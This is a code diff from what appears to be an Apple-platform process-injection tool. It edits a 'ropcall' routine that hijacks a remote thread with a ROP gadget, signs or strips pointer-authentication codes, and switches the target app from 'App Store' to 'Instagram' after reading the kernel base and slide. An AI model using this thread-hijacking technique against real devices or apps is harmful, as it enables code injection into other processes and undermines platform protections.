@@ -95,15 +95,17 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 {
 	kern_return_t kret;
 
-	state.__opaque_pc = (void*) ptrauth_sign_unauthenticated((void*) function, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
-
 #ifndef __arm64e__
+	state.__pc = (uint64_t) ptrauth_sign_unauthenticated((void*) function, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
+
 	thread_convert_thread_state(thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64, reinterpret_cast<thread_state_t>(&state), stateCount, reinterpret_cast<thread_state_t>(&state), &stateCount);
 
-	state.__opaque_lr = (void*)gadget_address;
-	state.__opaque_sp = (void*) ((remote_stack + STACK_SIZE) - (STACK_SIZE / 4));
-	state.__opaque_fp = (void*) state.__opaque_sp;
+	state.__lr = gadget_address;
+	state.__sp = ((remote_stack + STACK_SIZE) - (STACK_SIZE / 4));
+	state.__fp = state.__sp;
 #else
+	state.__opaque_pc = (void*) ptrauth_sign_unauthenticated((void*) function, ptrauth_key_process_independent_code, ptrauth_string_discriminator("pc"));
+
 	state.__opaque_lr = (void*) ptrauth_sign_unauthenticated((void*)gadget_address, 0, ptrauth_string_discriminator("lr"));
 	state.__opaque_sp = (void*) ptrauth_sign_unauthenticated((void*)((remote_stack + STACK_SIZE) - (STACK_SIZE / 4)), ptrauth_key_asda, ptrauth_string_discriminator("sp"));
 	state.__opaque_fp = (void*) ptrauth_sign_unauthenticated((void*)((remote_stack + STACK_SIZE) - (STACK_SIZE / 4)), ptrauth_key_asda, ptrauth_string_discriminator("fp"));;
@@ -221,7 +223,11 @@ static uint64_t ropcall(mach_vm_address_t function, char *argMap, uint64_t *arg1
 
 		thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &stateCount);
 
+	#ifdef __arm64e__
 		if(ptrauth_strip(state.__opaque_pc, ptrauth_key_process_independent_code) == (void*) gadget_address)
+	#else
+		if(state.__pc == gadget_address)
+	#endif
 		{
 			printf("Returned from function!\n");
 
@@ -472,7 +478,7 @@ int main()
 
 	printf("Kernel base = 0x%llx slide = 0x%llx\n", kernel->getBase(), kernel->getSlide());
 
-	task = new Task(kernel, "App Store");
+	task = new Task(kernel, "Instagram");
 
 	printf("PID 1382 task = 0x%llx proc = 0x%llx\n", task->getTask(), task->getProc());
 	
